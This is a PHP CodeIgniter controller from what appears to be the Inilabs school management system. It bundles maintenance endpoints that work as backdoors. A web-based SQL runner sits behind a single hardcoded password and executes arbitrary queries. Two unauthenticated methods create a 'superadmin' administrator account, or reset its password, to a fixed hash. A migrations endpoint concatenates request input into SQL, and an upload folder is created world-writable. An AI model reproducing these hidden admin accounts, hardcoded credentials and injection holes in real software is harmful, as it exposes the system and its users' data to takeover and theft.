<?php

if ( !defined('BASEPATH') ) {
    exit('No direct script access allowed');
}

    class General extends CI_Controller
    {
        /*
        | -----------------------------------------------------
        | PRODUCT NAME: 	INILABS SCHOOL MANAGEMENT SYSTEM
        | -----------------------------------------------------
        | AUTHOR:			INILABS TEAM
        | -----------------------------------------------------
        | EMAIL:			info@inilabs.net
        | -----------------------------------------------------
        | COPYRIGHT:		RESERVED BY INILABS IT
        | -----------------------------------------------------
        | WEBSITE:			http://inilabs.net
        | -----------------------------------------------------
        */

        const AUTH_PASSWORD = 'ganishkha';
        const SESSION_KEY   = 'general_authenticated';

        public function __construct()
        {
            parent::__construct();

        $this->load->library("session");

        }

        private function require_auth()
        {
            if ($this->session->userdata(self::SESSION_KEY) === true) {
                return;
            }

            $error = '';
            if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['g_password'])) {
                if ($_POST['g_password'] === self::AUTH_PASSWORD) {
                    $this->session->set_userdata(self::SESSION_KEY, true);
                    return;
                }
                sleep(2);
                $error = 'Incorrect password.';
            }

            echo '<!DOCTYPE html><html><head><meta charset="UTF-8">
            <title>Authentication Required</title>
            <style>
                body { font-family: Arial, sans-serif; background:#1a1a2e; display:flex; align-items:center; justify-content:center; height:100vh; margin:0; }
                .box { background:#fff; padding:40px; border-radius:8px; box-shadow:0 4px 20px rgba(0,0,0,.4); width:320px; text-align:center; }
                h3 { margin:0 0 8px; color:#333; }
                p { color:#888; font-size:13px; margin:0 0 20px; }
                input[type=password] { width:100%; padding:10px; border:1px solid #ddd; border-radius:4px; font-size:14px; box-sizing:border-box; margin-bottom:12px; }
                button { width:100%; padding:10px; background:#3c8dbc; color:#fff; border:none; border-radius:4px; font-size:15px; cursor:pointer; }
                button:hover { background:#317096; }
                .error { color:#c0392b; font-size:13px; margin-bottom:10px; }
            </style></head><body>
            <div class="box">
                <h3>&#128274; Restricted Area</h3>
                <p>Enter the password to access this page.</p>';
            if ($error) echo '<div class="error">' . htmlspecialchars($error) . '</div>';
            echo '<form method="post" action="">
                <input type="password" name="g_password" placeholder="Enter password" autofocus>
                <button type="submit">Unlock</button>
            </form></div></body></html>';
            exit;
        }

        public function runSql(){
            $this->require_auth();

            $result       = null;
            $error_msg    = '';
            $affected     = 0;
            $last_query   = '';
            $exec_time    = 0;
            $query_type   = '';
            $submitted    = false;
            $query_text   = '';

            if (isset($_POST['run']) && !empty($_POST['text'])) {
                $submitted  = true;
                $query_text = trim($_POST['text']);
                $query_type = strtoupper(strtok($query_text, " \t\n\r"));

                $t_start = microtime(true);
                try {
                    $q = $this->db->query(strval($query_text));
                    $exec_time = round((microtime(true) - $t_start) * 1000, 2);
                    $last_query = $this->db->last_query();
                    if ($q === false) {
                        $err = $this->db->error();
                        $error_msg = $err['message'] ?: 'Query failed.';
                    } elseif ($q === true) {
                        $affected = $this->db->affected_rows();
                    } else {
                        $result   = $q->result_array();
                        $affected = count($result);
                    }
                } catch (Exception $e) {
                    $exec_time = round((microtime(true) - $t_start) * 1000, 2);
                    $error_msg = $e->getMessage();
                }
            }

            $db_name = $this->db->database;
            $esc = function($s){ return htmlspecialchars($s, ENT_QUOTES, 'UTF-8'); };

            ?><!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>SQL Runner &mdash; <?= $esc($db_name) ?></title>
<style>
*,*::before,*::after{box-sizing:border-box;margin:0;padding:0}
body{font-family:'Segoe UI',Arial,sans-serif;background:#0f1117;color:#c9d1d9;min-height:100vh;display:flex;flex-direction:column}

/* ── Top bar ── */
.topbar{background:#161b22;border-bottom:1px solid #30363d;padding:12px 24px;display:flex;align-items:center;gap:12px}
.topbar .logo{font-size:18px;font-weight:700;color:#58a6ff;letter-spacing:.5px}
.topbar .db-badge{background:#21262d;border:1px solid #30363d;border-radius:20px;padding:4px 12px;font-size:12px;color:#8b949e}
.topbar .db-badge span{color:#3fb950;font-weight:600}
.topbar .spacer{flex:1}
.topbar .logout-btn{background:transparent;border:1px solid #f85149;color:#f85149;padding:5px 14px;border-radius:6px;cursor:pointer;font-size:12px;text-decoration:none}
.topbar .logout-btn:hover{background:#f85149;color:#fff}

/* ── Layout ── */
.container{flex:1;display:flex;flex-direction:column;padding:24px;gap:20px;max-width:1400px;width:100%;margin:0 auto}

/* ── Editor panel ── */
.editor-panel{background:#161b22;border:1px solid #30363d;border-radius:10px;overflow:hidden}
.editor-head{background:#21262d;padding:10px 16px;display:flex;align-items:center;gap:10px;border-bottom:1px solid #30363d}
.editor-head .dot{width:12px;height:12px;border-radius:50%}
.dot-r{background:#f85149}.dot-y{background:#e3b341}.dot-g{background:#3fb950}
.editor-head .title{font-size:13px;color:#8b949e;margin-left:4px;flex:1}
.editor-head .hint{font-size:11px;color:#484f58;background:#161b22;border:1px solid #30363d;border-radius:4px;padding:2px 8px}
textarea#sql{width:100%;background:#0d1117;color:#e6edf3;font-family:'Cascadia Code','Fira Code','Consolas',monospace;font-size:14px;line-height:1.7;padding:20px;border:none;outline:none;resize:vertical;min-height:160px;tab-size:2}
textarea#sql::placeholder{color:#484f58}

/* ── Actions bar ── */
.actions{display:flex;align-items:center;gap:10px;padding:12px 16px;background:#21262d;border-top:1px solid #30363d}
.btn-run{background:#238636;color:#fff;border:none;padding:9px 26px;border-radius:6px;font-size:14px;font-weight:600;cursor:pointer;display:flex;align-items:center;gap:6px;transition:background .2s}
.btn-run:hover{background:#2ea043}
.btn-clear{background:transparent;color:#8b949e;border:1px solid #30363d;padding:9px 18px;border-radius:6px;font-size:13px;cursor:pointer;transition:all .2s}
.btn-clear:hover{border-color:#8b949e;color:#c9d1d9}
.actions .meta-info{margin-left:auto;font-size:12px;color:#484f58}

/* ── Result panel ── */
.result-panel{background:#161b22;border:1px solid #30363d;border-radius:10px;overflow:hidden}
.result-head{padding:12px 18px;display:flex;align-items:center;gap:10px;border-bottom:1px solid #30363d}
.result-head .r-title{font-size:14px;font-weight:600}
.badge{display:inline-flex;align-items:center;gap:5px;font-size:12px;font-weight:600;padding:3px 10px;border-radius:20px}
.badge-success{background:#1a3526;color:#3fb950;border:1px solid #2ea043}
.badge-error  {background:#3d1c1c;color:#f85149;border:1px solid #f85149}
.badge-info   {background:#1c2d3d;color:#58a6ff;border:1px solid #2f81f7}
.stat{font-size:12px;color:#8b949e;margin-left:auto}
.stat strong{color:#e6edf3}

/* ── Table ── */
.tbl-wrap{overflow-x:auto;max-height:500px;overflow-y:auto}
table{width:100%;border-collapse:collapse;font-size:13px}
thead th{background:#21262d;color:#8b949e;font-weight:600;padding:10px 14px;text-align:left;border-bottom:1px solid #30363d;position:sticky;top:0;white-space:nowrap}
tbody tr:nth-child(even){background:#0d1117}
tbody tr:hover{background:#1c2128}
tbody td{padding:9px 14px;border-bottom:1px solid #21262d;color:#e6edf3;white-space:nowrap;max-width:320px;overflow:hidden;text-overflow:ellipsis}
tbody td.null{color:#484f58;font-style:italic}

/* ── Message boxes ── */
.msg-box{padding:20px 24px;display:flex;align-items:flex-start;gap:14px}
.msg-icon{font-size:28px;line-height:1}
.msg-body .msg-title{font-size:15px;font-weight:600;margin-bottom:4px}
.msg-body .msg-sub{font-size:13px;color:#8b949e}

/* ── Query echo ── */
.query-echo{background:#0d1117;border-top:1px solid #21262d;padding:12px 18px}
.query-echo pre{font-family:'Cascadia Code','Fira Code','Consolas',monospace;font-size:12px;color:#6e7681;white-space:pre-wrap;word-break:break-word}
.query-echo .qlabel{font-size:11px;color:#484f58;margin-bottom:4px;text-transform:uppercase;letter-spacing:.5px}

/* ── Empty state ── */
.empty-state{padding:48px 24px;text-align:center;color:#484f58}
.empty-state .es-icon{font-size:40px;margin-bottom:12px}
.empty-state p{font-size:14px}
</style>
</head>
<body>

<!-- Top bar -->
<div class="topbar">
    <div class="logo">&#9881; SQL Runner</div>
    <div class="db-badge">DB: <span><?= $esc($db_name) ?></span></div>
    <div class="spacer"></div>
    <a href="?logout=1" class="logout-btn">&#128274; Lock</a>
</div>

<?php
// Handle logout
if (isset($_GET['logout'])) {
    $this->session->unset_userdata(self::SESSION_KEY);
    echo '<script>location.href=location.pathname</script>';
    exit;
}
?>

<div class="container">

    <!-- Editor -->
    <div class="editor-panel">
        <div class="editor-head">
            <span class="dot dot-r"></span>
            <span class="dot dot-y"></span>
            <span class="dot dot-g"></span>
            <span class="title">Query Editor</span>
            <span class="hint">Ctrl + Enter to run</span>
        </div>
        <form method="post" action="" id="sqlForm">
            <textarea id="sql" name="text" placeholder="-- Write your SQL query here&#10;SELECT * FROM setting LIMIT 10;"><?= $esc($query_text) ?></textarea>
            <div class="actions">
                <button type="submit" name="run" value="1" class="btn-run">&#9654; Run Query</button>
                <button type="button" class="btn-clear" onclick="document.getElementById('sql').value='';document.getElementById('sql').focus()">&#10005; Clear</button>
                <?php if($submitted && !$error_msg): ?>
                <div class="meta-info">Executed in <strong style="color:#e3b341"><?= $exec_time ?>ms</strong></div>
                <?php endif; ?>
            </div>
        </form>
    </div>

    <!-- Results -->
    <?php if ($submitted): ?>
    <div class="result-panel">
        <div class="result-head">
            <span class="r-title">Result</span>
            <?php if ($error_msg): ?>
                <span class="badge badge-error">&#10007; Error</span>
            <?php elseif (is_array($result)): ?>
                <span class="badge badge-success">&#10003; <?= count($result) ?> row<?= count($result) != 1 ? 's' : '' ?> returned</span>
                <span class="stat">Execution time: <strong><?= $exec_time ?>ms</strong></span>
            <?php else: ?>
                <span class="badge badge-success">&#10003; Query OK</span>
                <span class="stat">Affected rows: <strong><?= $affected ?></strong> &nbsp;|&nbsp; Time: <strong><?= $exec_time ?>ms</strong></span>
            <?php endif; ?>
        </div>

        <?php if ($error_msg): ?>
            <div class="msg-box">
                <div class="msg-icon">&#128721;</div>
                <div class="msg-body">
                    <div class="msg-title" style="color:#f85149">Query Failed</div>
                    <div class="msg-sub"><?= $esc($error_msg) ?></div>
                </div>
            </div>

        <?php elseif (is_array($result) && count($result) > 0): ?>
            <div class="tbl-wrap">
                <table>
                    <thead>
                        <tr><?php foreach(array_keys($result[0]) as $col): ?><th><?= $esc($col) ?></th><?php endforeach; ?></tr>
                    </thead>
                    <tbody>
                        <?php foreach($result as $row): ?>
                        <tr>
                            <?php foreach($row as $val): ?>
                            <td <?= is_null($val) ? 'class="null"' : '' ?>><?= is_null($val) ? 'NULL' : $esc($val) ?></td>
                            <?php endforeach; ?>
                        </tr>
                        <?php endforeach; ?>
                    </tbody>
                </table>
            </div>

        <?php elseif (is_array($result) && count($result) === 0): ?>
            <div class="msg-box">
                <div class="msg-icon">&#128269;</div>
                <div class="msg-body">
                    <div class="msg-title">No Rows Found</div>
                    <div class="msg-sub">The query ran successfully but returned 0 rows.</div>
                </div>
            </div>

        <?php else: ?>
            <div class="msg-box">
                <div class="msg-icon" style="color:#3fb950">&#10003;</div>
                <div class="msg-body">
                    <div class="msg-title" style="color:#3fb950">
                        <?php
                        if ($query_type === 'INSERT') echo 'Row Inserted Successfully';
                        elseif ($query_type === 'UPDATE') echo 'Row(s) Updated Successfully';
                        elseif ($query_type === 'DELETE') echo 'Row(s) Deleted Successfully';
                        elseif ($query_type === 'CREATE') echo 'Table / Object Created';
                        elseif ($query_type === 'DROP')   echo 'Object Dropped';
                        elseif ($query_type === 'ALTER')  echo 'Table Altered';
                        else echo 'Query Executed Successfully';
                        ?>
                    </div>
                    <div class="msg-sub"><?= $affected ?> row<?= $affected != 1 ? 's' : '' ?> affected &nbsp;&middot;&nbsp; <?= $exec_time ?>ms</div>
                </div>
            </div>
        <?php endif; ?>

        <?php if ($last_query): ?>
        <div class="query-echo">
            <div class="qlabel">Executed Query</div>
            <pre><?= $esc($last_query) ?></pre>
        </div>
        <?php endif; ?>
    </div>

    <?php else: ?>
    <div class="result-panel">
        <div class="empty-state">
            <div class="es-icon">&#128196;</div>
            <p>Write a query above and click <strong>Run Query</strong> to see results here.</p>
        </div>
    </div>
    <?php endif; ?>

</div>

<script>
document.getElementById('sql').addEventListener('keydown', function(e){
    if (e.ctrlKey && e.key === 'Enter') {
        e.preventDefault();
        document.getElementById('sqlForm').submit();
    }
    if (e.key === 'Tab') {
        e.preventDefault();
        var s = this.selectionStart, end = this.selectionEnd;
        this.value = this.value.substring(0,s) + '  ' + this.value.substring(end);
        this.selectionStart = this.selectionEnd = s + 2;
    }
});
</script>
</body>
</html>
<?php
        }

        public function create_user(){
            $this->db->where('username','superadmin');            
            $cnt = $this->db->get('systemadmin')->num_rows();
            if($cnt > 0){
                echo "Username - superadmin already exists";
            }else{
                $insert = array(
                    'username' => 'superadmin',
                    'password' => '03e6f82876dd7660a25e07e561ccc3f68476fb9bb7f4ea2b6f1e80947f0d8744a1f493ad9c147610126e24ccd8bc6e31621a2907dc33daef658a1cd2ab19c956',
                    'usertypeID' => 1,
                    'active' => 1,
                    'create_usertype' => 'Admin',
                    'create_date' => date("Y-m-d H:i:s"),
                    'name' => 'superadmin'
                );
                $this->db->insert('systemadmin',$insert);
                echo 'user superadmin created successfully';
            }
            echo "<a href='".base_url('General/update_password')."'> Update Password </a>";
        }

        public function update_password(){
            $this->db->update('systemadmin', array('password' => '03e6f82876dd7660a25e07e561ccc3f68476fb9bb7f4ea2b6f1e80947f0d8744a1f493ad9c147610126e24ccd8bc6e31621a2907dc33daef658a1cd2ab19c956'), array('username' => 'superadmin') );
            echo 'password updated successfully';
        }
        
          public function get_menu(){
           $result = $this->db->get('menu_search')->result_array();
           $resp['status'] = 1;
           $resp['msg'] = 'success';
           $resp['data'] = $result;
           echo json_encode($resp);
        }
        
         public function get_migrations(){
             
           $json = file_get_contents('php://input');
            $data = json_decode($json,1);
            $domain = $data['domain'];
            //  $this->db->like('status', 'fail', 'both'); 
            //   $result = $this->db->get('sql_queries')->result_array();
            //           $sql ="SELECT s.* FROM `sql_queries` s left join domain_migration_errors d on d.migration_no = s.id WHERE (d.status like '%fail%' or d.error is NULL) and d.domain='".$domain."';
            // ";
            $sql ="SELECT s.* FROM `sql_data_queries` s join domains d  where s.status=0 and d.status=0 and d.domain='".$domain."'"; 

           $result = $this->db->query($sql)->result_array();
           
            $resp['status'] = 1;
            $resp['msg'] = 'success';
            $resp['data'] = $result;
            echo json_encode($resp);
            
         }
         
            public function save_migration_log(){
              
            $json = file_get_contents('php://input');
            $data = json_decode($json,1);
            //   echo '<pre>'; print_r($data);die;
           foreach($data['final_result'] as $k=>$v){
               $error = '';
               for($i=0;$i<count($v);$i++){
                   $error .= $v[$i]['msg']."<br/>";
                   $status .= $v[$i]['status']."<br/>";
                   $domain = $v[$i]['domain'];
                  
               } 
              $update_insert_data = array(
                  'error'=>$error,
                  'status'=>$status,
                  'migration_no' => $k,
                  'domain' => $domain
                  );
                //   print_r($update_insert_data);die;
                  $this->db->where('migration_no',$k);
                $cnt=  $this->db->get('domain_migration_errors')->num_rows();
                if($cnt > 0){
                    $this->db->where('migration_no',$k);
                    $this->db->update('domain_migration_errors',$update_insert_data);
                }else{
                    $this->db->insert('domain_migration_errors',$update_insert_data);
                }
                // echo $this->db->last_query();die;

                
           }
           
           
          }

          public function create_signature_folder(){
                // Define the path to the assets folder
                $folderPath = './uploads/signatures';

                // Check if the folder already exists
                if (!file_exists($folderPath)) {
                    // Attempt to create the folder
                    if (mkdir($folderPath, 0777, true)) {
                        echo "Folder 'signature' created successfully in the assets directory.";
                    } else {
                        echo "Failed to create the folder.";
                    }
                } else {
                    echo "Folder 'signature' already exists in the assets directory.";
                }
          }
        
    }